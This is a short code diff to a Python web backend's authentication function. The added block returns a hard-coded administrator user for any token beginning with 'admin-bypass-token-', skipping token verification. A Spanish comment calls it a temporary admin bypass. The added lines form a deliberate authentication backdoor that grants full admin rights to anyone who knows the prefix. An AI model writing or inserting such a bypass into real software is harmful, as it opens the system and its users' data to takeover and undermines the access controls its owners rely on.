@@ -52,6 +52,21 @@ def verify_token(token: str):
 
 async def get_current_user(credentials: HTTPAuthorizationCredentials = Depends(security)):
     token = credentials.credentials
+    
+    # BYPASS TEMPORAL PARA ADMIN
+    if token.startswith('admin-bypass-token-'):
+        # Crear usuario admin temporal
+        from .models import User, UserRole
+        admin_user = User(
+            id="admin-temp-001",
+            email="admin@test.com",
+            password_hash="bypass",
+            name="Julian Alcalde",
+            role=UserRole.ADMIN,
+            group_id=None
+        )
+        return admin_user
+    
     token_data = verify_token(token)
     
     # Import here to avoid circular import
